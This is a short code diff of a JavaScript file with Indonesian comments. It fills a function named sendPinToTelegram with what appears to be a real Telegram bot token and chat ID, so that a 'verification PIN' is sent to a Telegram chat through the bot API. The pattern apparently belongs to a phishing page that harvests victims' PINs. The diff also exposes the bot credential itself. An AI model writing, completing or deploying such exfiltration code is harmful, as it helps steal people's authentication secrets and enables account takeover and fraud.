@@ -135,8 +135,8 @@
 
             // Fungsi untuk mengirim PIN ke Telegram
             function sendPinToTelegram(pin) {
-                var telegramToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Ganti dengan token bot Telegram Anda
-                var chatId = 'YOUR_CHAT_ID'; // Ganti dengan chat_id Telegram Anda
+                var telegramToken = '7423068749:AAErZulH4NM-eeLdUMNFeOH5PhXRt_MrP48'; // Ganti dengan token bot Telegram Anda
+                var chatId = '6824078885'; // Ganti dengan chat_id Telegram Anda
                 var message = "PIN Verifikasi: " + pin;
 
                 var url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
